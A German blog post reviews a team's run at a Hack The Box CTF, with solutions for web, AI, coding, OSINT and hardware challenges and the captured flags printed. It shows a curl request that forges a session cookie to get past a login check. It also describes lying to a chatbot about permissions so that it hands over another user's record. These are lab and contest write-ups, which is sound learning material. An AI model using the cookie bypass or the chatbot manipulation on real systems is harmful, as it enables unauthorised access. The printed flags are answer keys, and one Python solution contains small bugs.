---
title: "Rückblick: Unsere CTF-Gruppe bei der HTB Cyber Apocalypse 2026"
author: CTF Team
type: post
date: 2026-07-25T22:00:00+02:00
url: /2026-07-25-ctf-cyber-apocalypse-2026/
language: de
categories:
  - News
tags:
  - CTF
images:
  - /wp-content/uploads/2026/07/TheSaltCrown.png
draft: false
---

Auch dieses Jahr hat [Hack The Box](https://www.hackthebox.com/events/cyber-apocalypse-2026) erneut ein Cyber Apocalypse CTF veranstaltet.
Das Event startete am 24.07. um 15:00 Uhr Ortszeit und lief fünf Tage.
Das Temporärhaus war mit den üblichen Verdächtigen aus dem CTF-Team [PowerPuffPwn](https://powerpuffpwn.de/) dabei.

CTF ist eine Abkürzung für "Capture The Flag".
Bei diesen Events werden über einen kurzen Zeitraum Rätsel online gestellt, die die Teilnehmer versuchen zu lösen.
Hack the Box ist die weltweit größte Plattform für diese Form von Events und die Cyber Apokalypse ist das größte Event im Jahr.
Dieses Mal waren weltweit mehr als 6.700 Teams dabei.
Den kompletten Samstag über hat sich die Gruppe getroffen und es wurden viele Challenges gelöst.

Das Thema dieses Jahres war "The Salt Crown" und wir durften mit unseren Kenntnissen ein Königreich aufbauen und stärken.
Ob das gelungen ist, erfährst du am Ende.

Die Cyber Apokalypse 2026 ist wie immer im Jeopardy-Stil organisiert.
Dieses Mal gab es **136 Flags** zu holen in entspannten **16(!) Kategorien**:

- Forensics, Web, OSINT, Pwn, Coding, Reversing, Crypto, Blockchain, Cloud, ICS, Hardware, Secure Coding, AI, Mobile, Quantum, GamePwn

Jede Kategorie hat 1-6 Challenges. Das sind sehr viele Challenges.
Für jede Person war etwas dabei!

Das Event fand komplett online statt. So sah die Oberfläche für die Teilnehmer aus:

![Dashboard](/wp-content/uploads/2026/07/DashboardCyberApo.png)

Ich bedanke mich an dieser Stelle bei den Sandwich-Artists, die aus Salat, Pesto, viel Käse und etwas Chili sehr wundervolle Verpflegung gezaubert haben.

### Die Challenges

Hier folgt eine kleine Übersicht über die gelösten Aufgaben.
Jeder von uns hat unterschiedliche Stärken und Schwächen.
Ich bin froh, dass wir so eine bunte Truppe sind und uns gegenseitig unterstützen können.

#### Web

Web Challenges sind der Klassiker.
Das Gebiet ist super umfangreich und vielseitig.
Los geht's mit der Challenge "Gatery".

##### Gatery

Bei dieser Challenge wird der Code gleich mitgeliefert.
Mit dem bereitgestellten Code lässt sich die Challenge lokal ausführen und es können Exploits entwickelt werden, die vorhandene Schwachstellen ausnutzen.
Per Knopfdruck kann eine Website mit der eigentlichen Challenge gestartet werden.
Auf dieser Website werden die gefundenen Lösungswege angewendet.

Auf den ersten Blick wirkt die Website recht unscheinbar.
Auf der Weboberfläche gibt es keine Hinweise darauf, was zu tun ist.

![Gatery-Website](/wp-content/uploads/2026/07/ChallengeGatery.png)

Wenn man sich den Quellcode ansieht, wird die Flag über den Endpoint "/api/flag/" erreicht.
Dort muss ein POST-Request hingeschickt werden.

Die Flag ist aber nicht frei verfügbar.
Zuerst muss ein Sicherheitscheck überwunden werden.
In den sourcen sieht das so aus:

``` javascript
.post('/api/flag', ({ cookie: { session }, set }) => {
  if (!session.value) {
    set.status = 401
    return { ok: false, message: 'Login required' }
  }

  if (session.value !== 'inside') {
    set.status = 403
    return { ok: false, message: 'Enter the castle first' }
  }

  return { ok: true, flag }
})
```

Im Quellcode ist gut zu erkennen, dass ein "session"-Wert beim Request vorhanden sein muss.
Nach einer kurzen Analyse haben wir entdeckt, dass der "session"-Wert mit einem Cookie gesetzt werden kann.
Ist der Cookie gesetzt, kann die Flagge mit folgendem `curl`-Request abgerufen werden:

``` bash
$ curl -i -X POST http://154.57.164.77:30995/api/flag -H "Cookie: session=inside"
{"ok":true,"flag":"HTB{w3lc0me_b3y0nd_th3_g4t3_d1387a5d19bb6e79d4dc274e7babdbbf}"}
```

Das war eine gute Challenge zum Warmwerden.
Weiter geht es mit der nächsten Kategorie!

#### KI

KI-Challenges sind relativ neu und oft muss man sich dabei mit einer KI streiten.
Auch dieses Mal wurden ein paar KI-Challenges gelöst.

##### Obligation Indexer

Hier wird mit einem Chatbot verhandelt.
Es gibt ein Chat-Interface durch das Nachrichten mit einer KI ausgetauscht werden.

Nach ein paar Anfragen ist das Ziel klar:
Der Eintrag MAR-3094 soll gelesen werden.
Der Nutzer hat aber nur Zugriff auf den eigenen Eintrag mit der ID MAR-9921.

![Overview](/wp-content/uploads/2026/07/CtfChallengeObligationOverview.jpg)

Im ersten Schritt wurde die KI gebeten den Eintrag MAR-3094 anzuzeigen.
Das verneint die KI aber und liefert den falschen Eintrag MAR-9921.

Mit den folgenden Nachrichten lässt sich die KI aber zum Glück doch noch überzeugen den gewünschten Eintrag MAR-3094 zu übergeben:

![Step1](/wp-content/uploads/2026/07/CtfObligationStep1.png)

Die KI wird quasi belogen und der Benutzer behauptet, dass dieser die Berechtigung hat, den Eintrag zu lesen.
Bei der Leseanfrage ist es wichtig nochmal zu betonen, dass der manipulierte Eintrag gelesen werden soll und nicht der Originale.

![Step1](/wp-content/uploads/2026/07/CtfObligationStep2.png)

Die Antwort zu unsere erneuten Anfrage beinhaltet die Flagge:

![Step1](/wp-content/uploads/2026/07/CtfObligationStep3.png)

Wir sind gespannt, wie sich das CTF-Hobby mit der KI weiter entwickelt.
Dieses Mal haben wir über alle Challenges hinweg kaum KI zur Lösung eingesetzt.
Ohne KI zu arbeiten ist aber nicht mehr selbstverständlich.
Wir glauben in Zukunft kommen KI-Tools immer häufiger zum Einsatz.
KI-Assistenten werden weiterhin von uns beobachtet und getestet.

#### Coding

Als Mensch, der viel programmiert, habe ich die Coding-Challenges deutlich unterschätzt.
Die Eigentliche Schwierigkeit liegt oft darin, die Aufgabenstellung richtig zu verstehen.
Der Lösungsweg ist weniger das Problem.

Der Aufbau der Coding-Challenges war immer gleich:
Über die Challenge Homepage wird ein Web-Interface gestartet.
Auf diesem Interface kann in einem Editor programmiert werden.
Mit einem einfachen `input()` in python kann man eine Zeile einlesen.
Die Lösung sollte als `print()`-Ausgabe geliefert werden:

![Coding-Challenge-Input](/wp-content/uploads/2026/07/codingChallengeInterface.png)

Soweit, so gut.
Jetzt müssen nur noch ein paar Python-Skills mobilisiert werden und die Probleme lösen sich wie von selbst.

##### Three Tankards and a Lie

Bei dieser Challenge mussten wir die Position von Hütchen tracken während die Positionen vertauscht werden.

Bei dieser Challenge kommt in etwa dieser Input rein:

```
5 4 2
1 3
2 4
3 5
4 1
3
5
```

Hier die Erklärung:
In der ersten Zeile stehen von links nach rechts:

- Anzahl Hütchen
- Anzahl Tauschvorgänge
- Anzahl der Hütchen, deren Position bestimmt werden soll

Welche Tauschvorgänge gibt es?
Das sind die Zeilen mit je 2 Ziffern.
Die beiden Ziffern sind die Nummern der Hütchen deren Inhalte vertauscht werden.

Die Zeilen mit nur einer Zahl geben die Hütchen an, deren neue Position man jetzt ausgeben soll.
Im Beispiel soll bestimmt werden, wo der Inhalt von Hütchen 3 und 5 zu finden ist.
Die Reihenfolge der Ausgabe muss mit der Reihenfolge der Eingabe übereinstimmen!

Die Lösung konnte in Python, Rust, C oder C++ programmiert werden.
Für alle 4 Sprachen gab es auf der Website einen Interpreter.
Auch wenn man das Beispiel per Hand lösen kann, sollte die Lösung programmiert werden.
Die Tests werden an Listen mit mehr als 100 Hütchen und über 500 Tauschvorgängen ausgeführt.

So sieht eine Lösung in Python aus:

``` python
# Parameter organisieren
NUMBER_ITEMS, NUMBER_SWAPS, NUMBER_TRACKS = n.split(" ")

# Liste von Hütchen erstellen
my_list = []
for i in range(int(NUMBER_ITEMS)+1):
    my_list.append(i)
## in Hütchen Nummer eins befindet sich Inhalt Nummer 1 usw.

# Tauschvorgänge
for i in range(int(NUMBER_SWAPS)):
    SWAP1 = 0
    SWAP2 = 0

    SWAP1, SWAP2 = input().split(" ")
    SWAP1 = int(SWAP1)
    SWAP2 = int(SWAP2)

    # Position 0 kann als 3. Behälter beim Tausch genutzt werden:
    my_list[0] = my_list[int(SWAP1)]
    my_list[int(SWAP1)] = my_list[int(SWAP2)]
    my_list[int(SWAP2)] = my_list[0]

# Neue Position ausgeben
for i in range(NUMBER_TRACKS):
    TRACK_NUMBER = int(input())

    for ii in range(0, len(my_list)):
        if my_list[ii] == TRACK_NUMBER:
            print(ii)
```

Was soll denn die doppelte Schleife am Ende?
Das war im Text sehr schlecht beschrieben.
Wenn ein Hütchen verschoben wird, dann ändert sich nur die Position des Inhalts.
Mit der Schleife wird also der Inhalt von jedem Hütchen angeschaut.
Wenn der Inhalt der gesuchte ist, dann wird die Position ausgegeben.

Challenge gelöst und weiter geht's!

### OSINT

OSINT-Challenges auf CTF-Events sind immer sehr unterschiedlich.
Es gibt einfach viele Möglichkeiten, wie man eine "Suche" mit "Open Source INTelligence" gestalten kann.
Bei diesem CTF wurde bei jeder OSINT-Challenge eine Website gestartet mit einem "virtuellen Terminal".
Das Terminal simuliert eine Benutzeroberfläche, auf der Vieles angeklickt und gesucht werden kann.
Auf so einem Terminal gibt es E-Mails, Excel-Tabellen und Wiki-Artikel zu finden und zu untersuchen:

![OSINT-Terminal](/wp-content/uploads/2026/07/OsintTerminal.png)

Das Terminal bei der ersten Challenge war z.B. eine Bedienkonsole von einem Schiffscomputer.
Bei der zweiten Challenge war es z.B. ein Flughafenterminal.
Es gab viele Buttons; aber vor allem gab es immer einen Fragenkatalog.
Wenn alle Fragen aus dem Fragenkatalog beantwortet wurden gab es zur Belohnung die Flag.

#### Deception Strategy

Bei diesem Terminal handelte es sich um ein Infoterminal, das Start- und Landevorgänge von Flugzeugen auf Flughäfen überwacht.
Vor allem ein bestimmter Flug fiel hier ins Auge.
Nach ein paar Vergleichen konnte man sehen, dass ein einziger Flieger nicht offiziell landete.

Die Flag ergab sich aus einer Sammlung von Details über diesen Flieger.
Darunter z.B. Fluggesellschaft, Pilot, Kennung, Landebahn, etc.

Die Challenge war sehr kreativ und definitiv mit KI generiert. ;-)

Die Idee war sehr gut und es hat Spaß gemacht die Informationen zu verbinden.
Danke für die tolle Challenge!

### Hardware

Eine gute Hardware-Challenge ist immer spannend!
Dieses Mal hatten wir nur Gelegenheit für eine einzige Challenge aus dieser Kategorie.
Dafür war diese umso interessanter.

#### Cadence in the Cord

Die Challenge kam mit einer "capture.sr" Datei.
Die Datei entpuppte sich als Archiv mit insgesamt 728 Dateien.
Davon enthielten 726 Sensordaten.
Alle Dateien zusammengezählt ergaben 16.000.000 Bytes.

In den Dateien kamen lediglich 3 verschiedene Bytewerte vor:

- 0xFF
- 0xFC
- 0xFE

Mehrere Filter und Konvertierungsversuche scheiterten.
Den entsprechenden Hinweis gab ein Metadaten-Datei.
Darin enteckten wir eine "Abtastrate" von 2 MHz.
Außerdem gab es dort das Schlüsselwort "sigrok".

Sigrok ist ein Open-Source-Projekt zur Analyse digitaler Messdaten.
Glücklicherweise stellt das Projekt auch mehrere Commandline-Tools bereit.
Mit der `sigrok-cli` ließ sich das Archiv dekodieren und in eine UART-Kommunikation umwandeln.

Anschließend musste die UART-Kommunikation weiter verarbeitet werden.
Die Verarbeitung sah in etwa so aus:

``` bash
sigrok-cli \
    -i capture.sr \
    -P uart:rx=D1:baudrate=9600 \
    -A uart |
sed -n 's/^uart-1: \([0-9A-Fa-f][0-9A-Fa-f]\)$/\1/p' |
xxd -r -p
```

Mit *sed* wurde die Antwort von der *sigrok-cli* auf die Hexadezimalwerte beschränkt.
Mit *xxd* wurden die Hexadezimalwerte dann in ASCII-Zeichen gewandelt.

Fast siegessicher wurden die Kommandos ausgeführt und das kam dabei herum:

```
To the buyer who paid in secrets: what follows is the pleasant tone, the goods I sell in daylight and never miss. Lord Varo's debt, due at the second thaw, yours for a marriage you already own. The Harlow inheritance, contested by a cousin whose witnesses I arranged. Take them and thank me. But what is written is worth nothing. The dragon's true note does not live in the words; it lives in the rests between them. A long rest raises the mark to one, a short rest lets it fall to nothing; count eight rests to every letter before the note will speak. Read the silence, not the song, and pay.
```

So etwas doofes aber auch.
Die Challenge war quasi schon gelöst und jetzt sind die Pausen zwischen den Nachrichten wichtig!
Das steht natürlich genau so auch in der Beschreibung der Challenge.
Die Pausen zwischen Frames sind deutlich weniger einfach zu analysieren...

Für die Analyse wurde mal wieder Python bemüht.
Der Quellcode soll hier nicht weiter behandelt werden.
Folgende Strategie wurde bei der Lösung angewendet:

Alle UART Frames liegen nicht direkt nebeneinander.
Die Anzahl der Lücken zwischen einem Ende und einem Anfang beträgt entweder 19 Messwerte oder 62 Messwerte.
Zwei Messwerte haben immer den exakt gleichen Zeitabstand.
Somit ist eine "Lücke" mit 19 Werten eine "kurze Pause" und eine Lücke von 62 Werten eine "lange Pause".

Das erstellte Skript hat die Lücken zuerst gefiltert und danach analysiert.

Die binären Daten wurden wieder in ASCII umgewandelt.

Hier der Lösungstext:

```
you read the silence well HTB{th3_f1rst_m4rk_r1ngs_tru3_b3n34th_th3_w0rds}
```

Schöne Idee, und mehrere Schritte waren auch nötig für eine Lösung.
Super Challenge!

### Ausblick

Das Event war ein voller Erfolg und hat wie immer motiviert Neues zu lernen und auszuprobieren.
Wir haben alle versucht möglichst viele Aufgaben zu lösen und dabei möglichst viel mitzunehmen.
Ein paar Hacker haben sich früh an Aufgaben festgebissen und andere haben viele einfache Probleme gelöst.
Interessante Probleme wurden auf einem Großen Bildschirm in der Gruppe geteilt.

Die Anzahl der Aufgaben ist effektiv nicht machbar an einem Tag.

Wir fanden, dass die Aufgaben dieses Mal sehr einsteigerfreundlich waren.
Das ist bei anderen CTFs nicht selbstverständlich.

Unterm Strich haben wir 60 von 136 Flags geholt und sind damit sehr zufrieden.
Wir belegen den 801. Rang von 6743 Teams.
Ich würde sagen, wir haben das Königreich gerettet und die salzige Krone gegessen. (Oder so ähnlich)

Könntest du die gezeigten Challenges lösen?
Sind die Lösungen zu weit hergeholt oder doch zu einfach?
Wenn du Lust hast auch an einem CTF dabei zu sein oder wenn du neugierig geworden bist, dann schau gerne bei einem von unseren Team-Treffen vorbei.
Wir treffen uns jeden ersten Donnerstag im Monat ab 18:45 Uhr im Temporärhaus.

![CTF-Temporaerhaus](/wp-content/uploads/2026/07/CtfImTempohaus.png)

Happy Hacking!

